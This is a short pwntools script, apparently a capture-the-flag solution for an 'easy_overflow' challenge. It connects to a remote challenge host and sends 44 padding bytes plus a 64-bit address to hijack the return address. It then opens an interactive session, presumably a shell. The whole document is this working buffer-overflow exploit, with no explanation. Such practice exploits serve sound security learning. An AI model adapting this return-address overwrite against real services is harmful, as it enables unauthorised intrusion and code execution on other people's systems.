from pwn import *
elf=ELF('./easy_overflow/easy_overflow')
p=remote('node5.anna.nssctf.cn',29068)
payload=b'a'*44+p64(0x401220)
p.sendline(payload)
p.interactive()
